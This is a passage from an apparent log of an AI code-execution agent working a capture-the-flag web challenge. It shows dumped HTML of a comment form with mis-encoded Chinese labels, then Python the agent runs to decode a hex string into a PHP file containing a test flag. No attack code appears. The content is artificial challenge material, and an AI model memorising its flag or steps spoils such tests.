                           </section>\n                            </div>\n                        </div>\n                    </div>\n
 </div>\n        </section>\n\n\n    <script src="/vendor/jquery-1.11.1.min.js"></script>\n    <script src="/bootstrap/js/bootstrap.js"></script>\n   
 <script src="/vendor/jquery.easing.min.js"></script>\n    <script src="/vendor/jquery.placeholder.js"></script>\n    <script src="/vendor/fastclick.js"></script>\n\n\n    <script src="/vendor/bootstrap-select/bootstrap-select.js"></script>\n    <script src="/vendor/dropzone/dropzone.js"></script>\n    <script src="/vendor/parsley.min.js"></script>\n    <script src="/vendor/fuelux/checkbox.js"></script>\n    <script src="/vendor/fuelux/radio.js"></script>\n    <script src="/vendor/fuelux/wizard.js"></script>\n    <script src="/vendor/fuelux/pillbox.js"></script>\n    <script src="/vendor/fuelux/spinner.js"></script>\n    <script src="/vendor/slider/bootstrap-slider.js"></script>\n    <script src="/vendor/bootstrap-datepicker/bootstrap-datepicker.js"></script>\n    <script src="/vendor/wysiwyg/jquery.hotkeys.js"></script>\n    <script src="/vendor/wysiwyg/bootstrap-wysiwyg.js"></script>\n    <script src="/vendor/switchery/switchery.js"></script>\n    <script src="/vendor/timepicker/jquery.timepicker.js"></script>\n    <script src="/vendor/offline/offline.min.js"></script>\n    <script src="/vendor/pace/pace.min.js"></script>\n\n    <script src="/vendor/jquery.slimscroll.js"></script>\n    <script src="/js/off-canvas.js"></script>\n    <script src="/js/main.js"></script>\n\n    <script src="/js/panel.js"></script>\n    <script src="/js/forms.js"></script>\n<script language="javascript">  \nfunction submit_check(){\n    var gnl=confirm("\xc3\xa7\xc2\xa1\xc2\xae\xc3\xa5\xc2\xae\xc2\x9a\xc3\xa8\xc2\xa6\xc2\x81\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4?");\n    if (gnl==true){\n        return true;\n    }\n    else{\n     
   return false;\n    }\n    }\n</script> \n</body>\n</html>\n'
id 5: b'<!doctype html>\n<html class="no-js" lang="">\n\n<head>\n\n    <meta charset="utf-8">\n    <meta name="description" content="">\n    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1">\n\n    <title>\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80\xc3\xa6\xc2\x9d\xc2\xbf</title>\n\n<style type="text/css"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel="stylesheet" href="/vendor/bootstrap-select/bootstrap-select.css">\n    <link rel="stylesheet" href="/vendor/dropzone/dropzone.css">\n    <link rel="stylesheet" href="/vendor/slider/slider.css">\n    <link rel="stylesheet" href="/vendor/bootstrap-datepicker/datepicker.css">\n    <link rel="stylesheet" href="/vendor/timepicker/jquery.timepicker.css">\n    <link rel="stylesheet" href="/vendor/offline/theme.css">\n    <link rel="stylesheet" href="/vendor/pace/theme.css">\n\n\n    <link rel="stylesheet" href="/bootstrap/css/bootstrap.min.css">\n    <link rel="stylesheet" href="/css/font-awesome.min.css">\n    <link rel="stylesheet" href="/css/animate.min.css">\n\n    <link rel="stylesheet" href="/css/panel.css">\n\n    <link rel="stylesheet" href="/css/skins/palette.1.css" id="skin">\n    <link rel="stylesheet" href="/css/fonts/style.1.css" id="font">\n    <link rel="stylesheet" href="/css/main.css">\n\n    <script src="/vendor/modernizr.js"></script>\n</head>\n\n<body>\n            <section class="main-content">\n                <div class="content-wrap">\n                    <div class="row">\n                        <div class="col-lg-12">\n                            <div class="tab-content ">\n                                <section class="tab-pane active">\n                                            <section class="panel">\n        
                                        <header class="panel-heading"><b></b></header>\n                                                <div class="panel-body">\n                                                    <form class="form-horizontal bordered-group" role="form" method="post" action="./write_do.php?do=comment" onsubmit="return submit_check()">\n                                                        <div class="form-group">\n
                                               <label class="col-sm-2 control-label">\xc3\xa6\xc2\xad\xc2\xa3\xc3\xa6\xc2\x96\xc2\x87</label>\n       
                                                     <div class="col-sm-5">\n                                                                <p></p>\n                                                            </div>\n                                                        </div>\n
                                      <div class="form-group">\n                                                            <label class="col-sm-2 control-label">\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4\xc3\xa7\xc2\x95\xc2\x99\xc3\xa8\xc2\xa8\xc2\x80</label>\n
                            <div class="col-sm-5">\n                                                                <textarea name="content" class="form-control" rows="8"></textarea>\n                                                                <input hidden name="bo_id" value="5">\n
                                               </div>\n                                                        </div>\n
                         <div class="form-group">\n                                                            <label class="col-sm-2 control-label"></label>\n                                                            <div class="col-sm-10">\n
        <button type="submit" class="btn btn-success"><i class="fa fa-check"></i>\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4</button>\n
                                                  </div>\n                                                        </div>\n
                        </form>\n                                                </div>\n                                            </section>\n     
                           </section>\n                            </div>\n                        </div>\n                    </div>\n
 </div>\n        </section>\n\n\n    <script src="/vendor/jquery-1.11.1.min.js"></script>\n    <script src="/bootstrap/js/bootstrap.js"></script>\n   
 <script src="/vendor/jquery.easing.min.js"></script>\n    <script src="/vendor/jquery.placeholder.js"></script>\n    <script src="/vendor/fastclick.js"></script>\n\n\n    <script src="/vendor/bootstrap-select/bootstrap-select.js"></script>\n    <script src="/vendor/dropzone/dropzone.js"></script>\n    <script src="/vendor/parsley.min.js"></script>\n    <script src="/vendor/fuelux/checkbox.js"></script>\n    <script src="/vendor/fuelux/radio.js"></script>\n    <script src="/vendor/fuelux/wizard.js"></script>\n    <script src="/vendor/fuelux/pillbox.js"></script>\n    <script src="/vendor/fuelux/spinner.js"></script>\n    <script src="/vendor/slider/bootstrap-slider.js"></script>\n    <script src="/vendor/bootstrap-datepicker/bootstrap-datepicker.js"></script>\n    <script src="/vendor/wysiwyg/jquery.hotkeys.js"></script>\n    <script src="/vendor/wysiwyg/bootstrap-wysiwyg.js"></script>\n    <script src="/vendor/switchery/switchery.js"></script>\n    <script src="/vendor/timepicker/jquery.timepicker.js"></script>\n    <script src="/vendor/offline/offline.min.js"></script>\n    <script src="/vendor/pace/pace.min.js"></script>\n\n    <script src="/vendor/jquery.slimscroll.js"></script>\n    <script src="/js/off-canvas.js"></script>\n    <script src="/js/main.js"></script>\n\n    <script src="/js/panel.js"></script>\n    <script src="/js/forms.js"></script>\n<script language="javascript">  \nfunction submit_check(){\n    var gnl=confirm("\xc3\xa7\xc2\xa1\xc2\xae\xc3\xa5\xc2\xae\xc2\x9a\xc3\xa8\xc2\xa6\xc2\x81\xc3\xa6\xc2\x8f\xc2\x90\xc3\xa4\xc2\xba\xc2\xa4?");\n    if (gnl==true){\n        return true;\n    }\n    else{\n     
   return false;\n    }\n    }\n</script> \n</body>\n</html>\n'


--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: Extract possible strings from the content and decode them hexadecimal
user_proxy (to code_exec_agent):

Extract possible strings from the content and decode them hexadecimal

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
import re

content = """
id 1: <!doctype html>rn<html class="signin no-js" lang="">rn<head>rn...       
id 2: <!doctype html>rn<html class="signin no-js" lang="">rn<head>rn...       
id 3: content...<p>3C3F7068700A0924666C61673D22666C61677B666C61675F74657374...
id 4: <!doctype html>rn<html class="signin no-js" lang="">rn<head>rn...
id 5: <!doctype html>rn<html class="signin no-js" lang="">rn<head>rn..."""

# Find hex data using regex
hex_values = re.findall(r'[0-9A-Fa-f]{2,}', content)

# Convert hex data to ASCII if possible
decoded_strings = []
for hex_val in hex_values:
    try:
        decoded_string = bytes.fromhex(hex_val).decode('utf-8')
        decoded_strings.append(decoded_string)
    except:
        pass

# Print all decoded strings
for decoded_string in decoded_strings:
    print(decoded_string)
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 0 (execution succeeded)
Code output:
<?php
        $flag="flag{flag_test


--------------------------------------------------------------------------------
Provide feedback to code_exec_agent. Press enter to skip and use auto-reply, or type 'exit' to end the conversation: The string "3 c3f7068700a0924666c61673d22666c61677b666c61675f746573747d223b0a3f3e0a" hexadecimal conversion
user_proxy (to code_exec_agent):

The string "3 c3f7068700a0924666c61673d22666c61677b666c61675f746573747d223b0a3f3e0a" hexadecimal conversion

--------------------------------------------------------------------------------
**********要执行的代码**********
```python
hex_string = "3c3f7068700a0924666c61673d22666c61677b666c61675f746573747d223b0a3f3e0a"
decoded_string = bytes.fromhex(hex_string).decode('utf-8')
print(decoded_string)
```
**********开始执行代码**********

>>>>>>>> EXECUTING CODE BLOCK 0 (inferred language is python)...
code_exec_agent (to user_proxy):

exitcode: 0 (execution succeeded)
Code output:
<?php
        $flag="flag{flag_test}"; 
?>